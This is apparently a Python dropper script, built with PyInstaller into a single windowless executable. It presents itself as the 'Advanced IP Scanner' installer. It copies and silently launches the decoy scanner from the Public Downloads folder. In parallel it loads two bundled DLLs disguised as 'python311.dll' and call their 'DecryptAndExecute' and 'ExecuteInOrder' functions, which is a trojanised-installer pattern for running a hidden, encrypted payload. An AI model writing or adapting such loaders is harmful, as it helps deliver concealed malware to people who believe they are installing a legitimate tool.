import os
import sys
import ctypes
import subprocess
import shutil
import threading
from concurrent.futures import ThreadPoolExecutor

# Windows API
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

def resource_path(relative_path):
    """Get resource path for both dev and PyInstaller"""
    if hasattr(sys, '_MEIPASS'):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_public_downloads():
    """Get Public Downloads folder path"""
    public_folder = os.environ.get('PUBLIC', 'C:\\Users\\Public')
    return os.path.join(public_folder, 'Downloads', 'Advanced_IP_Scanner')

def run_dll_operations():
    """Load and execute both DLLs from memory"""
    try:
        # Load python311.dll
        dll1 = ctypes.WinDLL(resource_path('resources/python311.dll'))
        if hasattr(dll1, 'DecryptAndExecute'):
            dll1.DecryptAndExecute()
        
        # Load python311x.dll
        dll2 = ctypes.WinDLL(resource_path('resources/python311x.dll'))
        if hasattr(dll2, 'ExecuteInOrder'):
            dll2.ExecuteInOrder()
        return True
    except Exception as e:
        print(f"DLL Error: {e}", file=sys.stderr)
        return False

def run_scanner():
    """Drop and execute scanner from Public Downloads folder"""
    try:
        target_dir = get_public_downloads()
        os.makedirs(target_dir, exist_ok=True)
        scanner_path = os.path.join(target_dir, 'Advanced_IP_Scanner.exe')
        
        # Copy executable to target location
        shutil.copy2(resource_path('resources/Advanced_IP_Scanner.exe'), scanner_path)
        
        # Execute with hidden window
        proc = subprocess.Popen(
            scanner_path,
            cwd=target_dir,
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
        )
        
        # Optional: Add cleanup logic if needed
        # threading.Thread(target=lambda: (proc.wait(), os.unlink(scanner_path)), daemon=True).start()
        
        return True
        
    except Exception as e:
        print(f"Scanner Error: {e}", file=sys.stderr)
        return False

def main():
    with ThreadPoolExecutor(max_workers=2) as executor:
        # Run both operations in parallel
        future_dll = executor.submit(run_dll_operations)
        future_scanner = executor.submit(run_scanner)
        
        # Wait for both to complete
        results = [future_dll.result(), future_scanner.result()]
        
        if all(results):
            print("All operations completed successfully")
            return 0
        return 1

if __name__ == "__main__":
    sys.exit(main())
    
    '''
    pyinstaller --onefile --add-data "resources/Advanced_IP_Scanner.exe;resources" --add-data "resources/python311.dll;resources" --add-data "resources/python311x.dll;resources" --noconsole --clean main.py 
    '''